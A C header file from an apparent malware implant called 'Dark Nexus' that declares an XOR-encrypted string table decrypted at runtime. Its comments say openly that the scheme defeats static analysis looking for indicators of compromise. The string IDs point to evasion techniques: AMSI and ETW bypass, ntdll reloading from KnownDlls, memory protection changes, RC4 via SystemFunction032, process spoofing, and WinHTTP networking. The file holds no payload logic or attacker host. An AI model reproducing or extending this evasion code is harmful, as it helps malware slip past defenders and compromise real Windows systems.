#ifndef DN_STRINGS_ENCRYPT_H
#define DN_STRINGS_ENCRYPT_H

#include <windows.h>

/*
 * Dark Nexus - Encrypted String Table
 *
 * All sensitive string literals (DLL names, API names, paths,
 * registry keys, URIs) are XOR-encrypted at build time and
 * stored as byte arrays. At runtime, strings are decrypted
 * into a caller-provided buffer, used, then zeroed.
 *
 * This defeats static analysis tools that scan PE imports
 * and string tables for indicators of compromise.
 *
 * Usage pattern:
 *   char buf[64];
 *   dn_decrypt_string(DN_STR_NTDLL, buf, sizeof(buf));
 *   HMODULE h = GetModuleHandleA(buf);
 *   SecureZeroMemory(buf, sizeof(buf));
 *
 * The encrypted table is generated by tools/encrypt_strings.py
 * and written to strings_table.h (auto-generated, do not edit).
 */

// String IDs (index into the encrypted table)
// Core DLL names
#define DN_STR_NTDLL            0
#define DN_STR_KERNEL32         1
#define DN_STR_ADVAPI32         2
#define DN_STR_AMSI             3
#define DN_STR_WINHTTP          4
#define DN_STR_BCRYPT           5
#define DN_STR_WS2_32           6
#define DN_STR_USER32           7

// API function names
#define DN_STR_ETWWRITE         8   // "EtwEventWrite"
#define DN_STR_AMSISCAN         9   // "AmsiScanBuffer"
#define DN_STR_RTLINITUSTR     10   // "RtlInitUnicodeString"
#define DN_STR_LOADLIBA        11   // "LoadLibraryA"
#define DN_STR_GETPROCADDR     12   // "GetProcAddress"
#define DN_STR_VIRTUALPROTECT  13   // "VirtualProtect"
#define DN_STR_SYSFN032        14   // "SystemFunction032"

// System paths
#define DN_STR_SYSTEM32        15   // "C:\\Windows\\System32\\"
#define DN_STR_NOTEPAD         16   // "notepad.exe"
#define DN_STR_RTBROKER        17   // "C:\\Windows\\System32\\RuntimeBroker.exe"
#define DN_STR_MSHTML          18   // "C:\\Windows\\System32\\mshtml.dll"

// KnownDlls path
#define DN_STR_KNOWNDLLS       19   // "\\KnownDlls\\ntdll.dll"

// User agent
#define DN_STR_USERAGENT       20   // default user agent string

// Registry / misc
#define DN_STR_USERDOMAIN      21   // "USERDOMAIN"
#define DN_STR_WORKGROUP       22   // "WORKGROUP"

#define DN_STR_COUNT           23

// Decrypt a string by ID into the provided buffer
// Returns pointer to buf on success, NULL on failure
// Caller MUST zero the buffer after use
char* dn_decrypt_string(int string_id, char* buf, int buf_size);

// Wide-char variant (decrypts then converts narrow to wide)
wchar_t* dn_decrypt_wstring(int string_id, wchar_t* buf, int buf_size);

#endif // DN_STRINGS_ENCRYPT_H
